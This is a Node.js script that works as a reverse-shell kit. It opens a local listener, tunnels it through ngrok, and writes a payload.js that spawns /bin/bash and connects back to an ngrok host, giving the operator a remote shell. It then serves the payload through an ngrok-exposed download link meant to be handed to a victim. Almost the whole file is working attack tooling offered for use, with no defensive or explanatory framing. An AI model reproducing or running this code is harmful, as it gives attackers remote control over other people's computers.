var net = require("net"),
    ngrok = require("@ngrok/ngrok"),
    readline = require("readline"),
    path = require("path"),
    express = require("express");
fs = require("fs-extra");
const G = `\x1b[32m`;
const C = `\x1b[36m`;
const R = `\x1b[31m`;
const Y = `\x1b[33m`;
const B = `\x1b[30m`;
const M = `\x1b[35m`;
const r = `\x1b[0m`;
const b = `\x1b[1m`;
async function Netcat(port, host) {
    const netcat = net.createServer(socket => {
        console.log(
            `[${G}*${r}]Connected: ${b}${socket.remoteAddress}:${socket.remotePort}${r}`
        );
        const rl = readline.createInterface({
            input: process.stdin,
            output: socket
        });
        rl.on("line", input => {
            socket.write(`${input}\n`);
        });
        socket.on("data", data => {
            console.log(data.toString());
        });
    });
    netcat.listen(port, host, () => {
        console.log(`[${G}*${r}]Listener connection actived!`);
    });
}
async function createPayload() {
    return new Promise(resolve => {
        ngrok
            .forward({ addr: 9000, authtoken_from_env: true, proto: "tcp" })
            .then(async listener => {
                const port = await listener
                    .url()
                    .split("tcp://")[1]
                    .split(":")[1];
                Netcat(9000, `127.0.0.1`);
                setTimeout(() => {
                    let nameFile = `payload.js`;
                    let payload = `(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(${port}, "0.tcp.ap.ngrok.io", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();`;
                    try {
                        fs.writeFileSync(nameFile, payload);
                        console.log(`[${C}*${r}]Payload has been created`);
                    } catch (err) {
                        console.error(`[${R}!${r}]Error Create Payload!`);
                    }
                    resolve();
                }, 2000);
            });
    });
}
async function pageDownloadPayload() {
    return new Promise(resolve => {
        const app = express();
        const filePath = path.join(__dirname, "payload.js");
        app.get("/download", (req, res) => {
            res.download(filePath, err => {
                if (err) {
                    res.status(500).send("Error Downloaded");
                }
            });
        });
        const server = app.listen(8080, () => {
            return;
        });
        ngrok
            .forward({ addr: 8080, authtoken_from_env: true, proto: "http" })
            .then(listener => {
                console.log(
                    `[${Y}*${r}]Link Download Payload: ${listener.url()}/download`
                );
                setTimeout(
                    () =>
                        console.log(`[${Y}!${r}]Waiting and listening for connection...`),
                    1000
                );
            });
        return server;
        setTimeout(() => resolve(), 3000);
    });
}
async function startAll() {
    await createPayload();
    await pageDownloadPayload();
}
startAll();
